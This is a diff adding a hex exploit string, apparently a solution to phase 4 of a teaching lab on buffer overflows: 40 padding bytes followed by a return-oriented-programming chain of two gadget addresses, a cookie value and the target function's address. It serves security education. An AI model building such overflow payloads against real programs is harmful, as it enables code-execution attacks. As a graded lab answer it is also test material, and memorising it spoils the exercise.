@@ -1,0 +1,10 @@
+/* Phase4 */
+ff ff ff ff ff ff ff ff ff ff 
+ff ff ff ff ff ff ff ff ff ff 
+ff ff ff ff ff ff ff ff ff ff 
+ff ff ff ff ff ff ff ff ff ff 
+/* 以上40字节 */
+ab 19 40 00 00 00 00 00 /* gadget address 1 */
+fa 97 b9 59 00 00 00 00 /* cookie: 59b997fa */
+a2 19 40 00 00 00 00 00 /* gadget address 2 */
+ec 17 40 00 00 00 00 00 /* touch2 address */
